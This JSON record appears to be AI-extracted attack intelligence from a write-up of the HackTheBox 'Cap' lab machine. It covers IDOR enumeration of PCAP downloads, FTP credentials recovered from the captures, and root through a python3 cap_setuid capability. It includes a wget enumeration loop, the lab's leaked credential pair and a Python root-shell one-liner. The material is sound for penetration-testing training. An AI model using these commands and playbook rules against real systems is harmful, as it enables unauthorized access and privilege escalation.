@@ -1,0 +1,838 @@
+{
+  "writeup_id": "Htb_Cap",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_web_idor_pcap_credential_disclosure",
+    "primary_services": [
+      "http",
+      "ftp",
+      "ssh"
+    ],
+    "port_signature": "21+22+80",
+    "service_combination": "ftp+ssh+http",
+    "os_family": "linux",
+    "environment_type": "web_application",
+    "entry_vector": "idor_vulnerability",
+    "privilege_path": "credential_disclosure_to_capabilities_escalation",
+    "attack_complexity": "easy",
+    "estimated_time": "30-45 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "pcap_download_functionality",
+      "sequential_idor_enumeration",
+      "ftp_credentials_in_network_capture",
+      "linux_capabilities_privilege_escalation"
+    ],
+    "environmental_clues": [
+      "gunicorn_web_server",
+      "security_dashboard_interface",
+      "network_monitoring_tools",
+      "ubuntu_20.04_fingerprint"
+    ],
+    "similar_scenarios": [
+      "cap_htb_easy"
+    ],
+    "unique_aspects": [
+      "live_pcap_capture_feature",
+      "credential_leakage_via_network_traffic",
+      "capabilities_based_privilege_escalation"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "IDOR_exploitation",
+        "success_reason": "Sequential PCAP download URLs with no access control",
+        "prerequisite_indicators": [
+          "sequential_url_parameters",
+          "no_authentication_required",
+          "predictable_resource_identifiers"
+        ],
+        "recognition_patterns": [
+          "incrementing URL parameters (/download/1, /download/2)",
+          "no session validation on resource access",
+          "global counter across all users"
+        ],
+        "failure_modes": [
+          "proper_access_control_implemented",
+          "randomized_resource_identifiers",
+          "session_based_authorization"
+        ],
+        "environmental_factors": [
+          "development_mindset_in_production",
+          "lack_of_security_testing",
+          "simple_incremental_design"
+        ],
+        "success_probability": 0.95,
+        "typical_timeframe": "2-5 minutes"
+      },
+      {
+        "technique": "credential_extraction_from_pcap",
+        "success_reason": "FTP credentials transmitted in cleartext within captured traffic",
+        "prerequisite_indicators": [
+          "cleartext_protocols_in_use",
+          "network_capture_contains_authentication",
+          "reused_credentials_across_services"
+        ],
+        "recognition_patterns": [
+          "FTP USER/PASS commands in pcap",
+          "cleartext protocol traffic",
+          "credential reuse patterns"
+        ],
+        "failure_modes": [
+          "encrypted_protocols_only",
+          "no_authentication_in_captures",
+          "unique_service_credentials"
+        ],
+        "environmental_factors": [
+          "legacy_cleartext_protocols",
+          "poor_credential_management",
+          "network_monitoring_capabilities"
+        ],
+        "success_probability": 0.85,
+        "typical_timeframe": "5-10 minutes"
+      },
+      {
+        "technique": "linux_capabilities_privilege_escalation",
+        "success_reason": "cap_setuid capability on python3 binary allowed arbitrary privilege escalation",
+        "prerequisite_indicators": [
+          "custom_capabilities_on_binaries",
+          "scripting_languages_with_elevated_caps",
+          "network_capture_functionality_requirements"
+        ],
+        "recognition_patterns": [
+          "getcap shows cap_setuid on interpreters",
+          "network monitoring applications present",
+          "custom capability assignments"
+        ],
+        "failure_modes": [
+          "minimal_capability_assignments",
+          "capability_aware_applications",
+          "proper_privilege_separation"
+        ],
+        "environmental_factors": [
+          "network_monitoring_requirements",
+          "insufficient_capability_understanding",
+          "overprivileged_service_design"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "10-15 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "PCAP 0 contains FTP credentials",
+        "discovery_method": "IDOR exploitation and traffic analysis",
+        "why_critical": "Provided initial foothold via credential reuse",
+        "how_to_recognize": [
+          "empty or low-numbered resource IDs",
+          "cleartext authentication protocols",
+          "credential reuse across services"
+        ],
+        "follow_up_actions": [
+          "test_ftp_access",
+          "test_ssh_with_same_credentials",
+          "enumerate_user_privileges"
+        ]
+      },
+      {
+        "discovery": "python3 binary with cap_setuid capability",
+        "discovery_method": "getcap enumeration",
+        "why_critical": "Direct path to root privilege escalation",
+        "how_to_recognize": [
+          "getcap output shows dangerous capabilities",
+          "network monitoring applications present",
+          "custom capability assignments on interpreters"
+        ],
+        "follow_up_actions": [
+          "craft_setuid_python_payload",
+          "spawn_root_shell",
+          "maintain_persistence"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "user_nathan",
+        "escalation_method": "linux_capabilities_abuse",
+        "why_possible": "python3 binary had cap_setuid capability for network monitoring",
+        "recognition_signs": [
+          "getcap_shows_setuid_on_python",
+          "network_capture_functionality_present",
+          "overprivileged_service_design"
+        ],
+        "exploitation_path": "os.setuid(0) in python → root shell"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 21,22,80 open on Linux host with web application",
+        "decision": "Enumerate web application for IDOR vulnerabilities first",
+        "reasoning": "Web app with sequential IDs in URLs indicates potential IDOR",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "ftp_anonymous_access",
+            "when": "if web enum fails"
+          },
+          {
+            "option": "ssh_bruteforce",
+            "when": "if credentials found"
+          }
+        ],
+        "success_indicators": [
+          "sequential_urls_found",
+          "pcap_downloads_available",
+          "different_user_data_accessible"
+        ],
+        "next_decision": "exploit_idor_vulnerability"
+      },
+      {
+        "step": 2,
+        "situation": "IDOR vulnerability confirmed in PCAP download functionality",
+        "decision": "Download all accessible PCAPs starting from ID 0",
+        "reasoning": "PCAP files may contain credentials from other users' traffic",
+        "confidence": 0.95,
+        "prerequisites": [
+          "sequential_download_urls",
+          "pcap_functionality_confirmed"
+        ],
+        "success_indicators": [
+          "multiple_pcaps_downloaded",
+          "network_traffic_captured"
+        ],
+        "failure_fallbacks": [
+          "manual_url_enumeration",
+          "directory_bruteforce"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Multiple PCAPs downloaded successfully",
+        "decision": "Analyze PCAPs for cleartext credentials in network protocols",
+        "reasoning": "FTP, HTTP, and other protocols often transmit credentials in cleartext",
+        "confidence": 0.85,
+        "prerequisites": [
+          "pcap_files_available"
+        ],
+        "success_indicators": [
+          "ftp_credentials_found",
+          "http_auth_discovered",
+          "cleartext_passwords"
+        ],
+        "failure_fallbacks": [
+          "web_application_source_analysis",
+          "service_enumeration"
+        ]
+      },
+      {
+        "step": 4,
+        "situation": "FTP credentials discovered in PCAP analysis",
+        "decision": "Test credentials against all available services (FTP, SSH)",
+        "reasoning": "Users often reuse passwords across multiple services",
+        "confidence": 0.9,
+        "prerequisites": [
+          "valid_credentials_found"
+        ],
+        "success_indicators": [
+          "ftp_access_granted",
+          "ssh_access_granted",
+          "user_flag_accessible"
+        ],
+        "failure_fallbacks": [
+          "credential_modification_attempts",
+          "service_specific_attacks"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_idor_succeeds": {
+        "action": "download_all_accessible_objects",
+        "tools": [
+          "wget",
+          "curl",
+          "custom_scripts"
+        ],
+        "next_phase": "data_analysis_for_credentials"
+      },
+      "if_pcap_analysis_succeeds": {
+        "action": "extract_and_test_credentials",
+        "tools": [
+          "wireshark",
+          "tcpdump",
+          "strings"
+        ],
+        "next_phase": "service_authentication_testing"
+      },
+      "if_credentials_valid": {
+        "action": "establish_shell_access",
+        "tools": [
+          "ssh",
+          "ftp"
+        ],
+        "next_phase": "privilege_escalation_enumeration"
+      },
+      "if_shell_obtained": {
+        "action": "enumerate_linux_capabilities",
+        "purpose": "find_privilege_escalation_vectors",
+        "tools": [
+          "getcap",
+          "linpeas",
+          "manual_enumeration"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_check_idor_on_sequential_urls",
+        "reasoning": "high_success_rate_and_often_overlooked_vulnerability",
+        "applicability": "web_applications_with_numeric_parameters"
+      },
+      {
+        "rule": "analyze_pcaps_for_cleartext_protocols_first",
+        "reasoning": "ftp_http_telnet_often_contain_immediate_credentials",
+        "applicability": "network_capture_files_available"
+      },
+      {
+        "rule": "test_found_credentials_across_all_services",
+        "reasoning": "password_reuse_extremely_common",
+        "applicability": "multiple_services_available"
+      },
+      {
+        "rule": "enumerate_linux_capabilities_after_user_access",
+        "reasoning": "capabilities_often_misconfigured_for_privilege_escalation",
+        "applicability": "linux_systems_with_user_shell"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "IDOR_Exploitation",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "web_application_with_sequential_ids",
+          "direct_object_references_in_urls",
+          "insufficient_access_controls"
+        ],
+        "success_indicators": [
+          "sequential_url_parameters",
+          "predictable_resource_identifiers",
+          "different_content_per_id"
+        ],
+        "incompatible_with": [
+          "proper_authorization_checks",
+          "randomized_resource_identifiers",
+          "session_based_access_control"
+        ],
+        "confidence_boosters": [
+          "incrementing_numeric_ids",
+          "file_download_functionality",
+          "user_specific_data_endpoints"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "PCAP_Credential_Extraction",
+        "mitre_id": "T1040",
+        "required_services": [
+          "ftp",
+          "telnet",
+          "http"
+        ],
+        "required_ports": [
+          21,
+          23,
+          80,
+          443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "network_capture_functionality",
+          "unencrypted_protocols_in_use",
+          "credential_transmission_over_network"
+        ],
+        "success_indicators": [
+          "pcap_download_available",
+          "cleartext_protocols_detected",
+          "authentication_packets_present"
+        ],
+        "incompatible_with": [
+          "encrypted_only_protocols",
+          "certificate_pinning",
+          "out_of_band_authentication"
+        ],
+        "confidence_boosters": [
+          "ftp_service_running",
+          "basic_auth_over_http",
+          "legacy_protocol_usage"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "15-45 minutes"
+      },
+      {
+        "technique": "Linux_Capabilities_Privilege_Escalation",
+        "mitre_id": "T1548.001",
+        "required_services": [
+          "ssh"
+        ],
+        "required_ports": [
+          22
+        ],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "linux_capabilities_misconfiguration",
+          "user_shell_access",
+          "binaries_with_elevated_capabilities"
+        ],
+        "success_indicators": [
+          "getcap_shows_dangerous_capabilities",
+          "cap_setuid_or_cap_dac_override_present",
+          "writable_privileged_binaries"
+        ],
+        "incompatible_with": [
+          "proper_capability_configuration",
+          "restricted_shell_environment",
+          "capability_aware_security_policies"
+        ],
+        "confidence_boosters": [
+          "python_with_capabilities",
+          "network_capture_requirements",
+          "custom_application_binaries"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "5-20 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https",
+          "gunicorn"
+        ],
+        "banner_indicators": [
+          "gunicorn",
+          "flask",
+          "django"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "linux_system": {
+        "port_indicators": [
+          22
+        ],
+        "service_indicators": [
+          "ssh",
+          "OpenSSH"
+        ],
+        "banner_indicators": [
+          "Ubuntu",
+          "OpenSSH"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "ftp_service": {
+        "port_indicators": [
+          21
+        ],
+        "service_indicators": [
+          "ftp",
+          "vsftpd"
+        ],
+        "banner_indicators": [
+          "vsftpd",
+          "FTP"
+        ],
+        "confidence_threshold": 0.95
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "idor_enumeration",
+          "when": "web_application_with_sequential_parameters",
+          "reason": "high_success_rate_immediate_access"
+        },
+        {
+          "attack": "pcap_analysis",
+          "when": "network_capture_functionality_detected",
+          "reason": "often_contains_cleartext_credentials"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "linux_capabilities_check",
+          "when": "user_shell_access_obtained",
+          "reason": "common_misconfiguration_easy_privesc"
+        },
+        {
+          "attack": "credential_reuse_testing",
+          "when": "credentials_extracted_from_pcap",
+          "reason": "users_often_reuse_passwords"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Insecure Direct Object Reference (IDOR)",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "wget",
+            "command_template": "for i in {0..500}; do wget {target}/download/${i} -O pcaps/${i}.pcap 2>/dev/null || break; done",
+            "actual_command": "for i in {0..500}; do wget 10.10.10.245/download/${i} -O pcaps/${i}.pcap 2>/dev/null || break; done",
+            "output_pattern": "Sequential PCAP files downloaded",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "wireshark",
+            "command_template": "wireshark {pcap_file}",
+            "actual_command": "wireshark 0.pcap",
+            "success_factors": [
+              "ftp_credentials_in_cleartext",
+              "tcp_stream_analysis"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "sequential_resource_identifiers",
+          "no_access_control_validation",
+          "predictable_resource_paths"
+        ],
+        "success_indicators": [
+          "access_to_unauthorized_resources",
+          "sensitive_data_exposure",
+          "credential_disclosure"
+        ],
+        "common_failures": [
+          "proper_access_controls_implemented",
+          "non_sequential_identifiers",
+          "rate_limiting_blocks_enumeration"
+        ],
+        "follow_up_techniques": [
+          "credential_reuse",
+          "ftp_authentication",
+          "ssh_authentication"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "PCAP Analysis for Credential Extraction",
+        "mitre_id": "T1040",
+        "category": "credential_access",
+        "phase": "credential_access",
+        "tools_used": [
+          {
+            "name": "wireshark",
+            "command_template": "wireshark {pcap_file}",
+            "actual_command": "wireshark 0.pcap",
+            "output_pattern": "FTP authentication in TCP streams",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          }
+        ],
+        "prerequisites": [
+          "network_capture_access",
+          "cleartext_protocol_usage",
+          "credential_transmission_captured"
+        ],
+        "success_indicators": [
+          "ftp_credentials_extracted",
+          "tcp_stream_contains_authentication",
+          "credentials_work_for_system_access"
+        ],
+        "common_failures": [
+          "encrypted_protocols_used",
+          "no_authentication_in_capture",
+          "corrupted_pcap_files"
+        ],
+        "follow_up_techniques": [
+          "credential_reuse_testing",
+          "service_authentication",
+          "lateral_movement"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Linux Capabilities Privilege Escalation",
+        "mitre_id": "T1548.001",
+        "category": "privilege_escalation",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "getcap",
+            "command_template": "getcap {binary_path}",
+            "actual_command": "getcap /usr/bin/python3.8",
+            "output_pattern": "cap_setuid,cap_net_bind_service+eip",
+            "effectiveness_rating": 5,
+            "reliability": 0.99
+          },
+          {
+            "name": "python",
+            "command_template": "python3 -c \"import os; os.setuid(0); os.system('/bin/bash')\"",
+            "actual_command": "/usr/bin/python3.8 -c \"import os; os.setuid(0); os.system('/bin/bash')\"",
+            "success_factors": [
+              "cap_setuid_capability_present"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "binary_with_setuid_capability",
+          "user_access_to_capable_binary",
+          "python_interpreter_available"
+        ],
+        "success_indicators": [
+          "root_shell_obtained",
+          "uid_0_achieved",
+          "full_system_privileges"
+        ],
+        "common_failures": [
+          "no_setuid_capability",
+          "restricted_python_environment",
+          "capability_not_effective"
+        ],
+        "follow_up_techniques": [
+          "persistence_establishment",
+          "system_enumeration",
+          "data_exfiltration"
+        ],
+        "time_investment": "2-5 minutes",
+        "skill_level": "intermediate"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "wget",
+        "use_case": "idor_exploitation",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_application_testing"
+        ],
+        "alternatives": [
+          "curl",
+          "burp_suite",
+          "custom_scripts"
+        ],
+        "best_practices": [
+          "use_loops_for_sequential_enumeration",
+          "implement_break_conditions",
+          "consider_rate_limiting"
+        ]
+      },
+      {
+        "tool": "wireshark",
+        "use_case": "network_traffic_analysis",
+        "effectiveness_rating": 5,
+        "reliability": 0.98,
+        "learning_curve": "medium",
+        "essential_for": [
+          "network_forensics",
+          "credential_extraction"
+        ],
+        "alternatives": [
+          "tcpdump",
+          "tshark",
+          "networkminer"
+        ],
+        "best_practices": [
+          "analyze_tcp_streams_for_cleartext_protocols",
+          "focus_on_authentication_sequences",
+          "export_objects_when_relevant"
+        ]
+      },
+      {
+        "tool": "getcap",
+        "use_case": "linux_capability_enumeration",
+        "effectiveness_rating": 5,
+        "reliability": 0.99,
+        "learning_curve": "low",
+        "essential_for": [
+          "linux_privilege_escalation"
+        ],
+        "alternatives": [
+          "linpeas",
+          "manual_enumeration"
+        ],
+        "best_practices": [
+          "check_common_binaries_first",
+          "understand_capability_implications",
+          "verify_effective_capabilities"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "idor_to_credential_extraction",
+        "steps": [
+          {
+            "step": 1,
+            "command": "for i in {0..500}; do wget 10.10.10.245/download/${i} -O pcaps/${i}.pcap 2>/dev/null || break; done",
+            "purpose": "Exploit IDOR to download all available PCAPs",
+            "expected_output": "Multiple PCAP files downloaded"
+          },
+          {
+            "step": 2,
+            "command": "wireshark 0.pcap",
+            "purpose": "Analyze PCAP for credentials",
+            "expected_output": "FTP credentials: nathan/Buck3tH4TF0RM3!"
+          },
+          {
+            "step": 3,
+            "command": "ssh nathan@10.10.10.245",
+            "purpose": "Authenticate with discovered credentials",
+            "expected_output": "SSH shell as nathan user"
+          }
+        ],
+        "success_rate": 0.92,
+        "typical_duration": "15-30 minutes"
+      },
+      {
+        "sequence_name": "linux_capabilities_privilege_escalation",
+        "steps": [
+          {
+            "step": 1,
+            "command": "getcap /usr/bin/python3.8",
+            "purpose": "Check Python capabilities",
+            "expected_output": "cap_setuid,cap_net_bind_service+eip"
+          },
+          {
+            "step": 2,
+            "command": "/usr/bin/python3.8 -c \"import os; os.setuid(0); os.system('/bin/bash')\"",
+            "purpose": "Exploit setuid capability for root shell",
+            "expected_output": "Root shell obtained"
+          }
+        ],
+        "success_rate": 0.98,
+        "typical_duration": "2-5 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Cap",
+      "difficulty": "Easy",
+      "os": "Linux Ubuntu",
+      "platform": "HackTheBox",
+      "release_date": "2021-06-05",
+      "author": "InfoSecJack",
+      "estimated_time": "30-45 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "low",
+      "skill_level_required": "beginner",
+      "primary_attack_vectors": [
+        "idor",
+        "linux_capabilities"
+      ],
+      "key_vulnerabilities": [
+        "insecure_direct_object_reference",
+        "excessive_capabilities"
+      ],
+      "environment_type": "linux_web_server",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "idor_exploitation",
+        "linux_capabilities_abuse",
+        "pcap_analysis"
+      ],
+      "prerequisite_knowledge": [
+        "basic_web_enumeration",
+        "linux_fundamentals",
+        "network_analysis"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_exploitation",
+      "subcategories": [
+        "idor",
+        "privilege_escalation",
+        "linux_capabilities"
+      ],
+      "attack_types": [
+        "information_disclosure",
+        "credential_access",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "proper_access_controls",
+        "capability_restrictions",
+        "secure_file_handling"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Shocker",
+        "Nibbles",
+        "Beep"
+      ],
+      "similarity_reasons": [
+        "web_enumeration",
+        "credential_reuse",
+        "linux_privesc"
+      ],
+      "unique_aspects": [
+        "pcap_analysis",
+        "linux_capabilities_abuse",
+        "idor_to_credentials"
+      ],
+      "difficulty_factors": [
+        "straightforward_idor",
+        "clear_attack_path",
+        "basic_enumeration"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T16:03:40.322862",
+    "original_file": "0xdf_writeups/Htb Cap.md",
+    "content_length": 18365,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
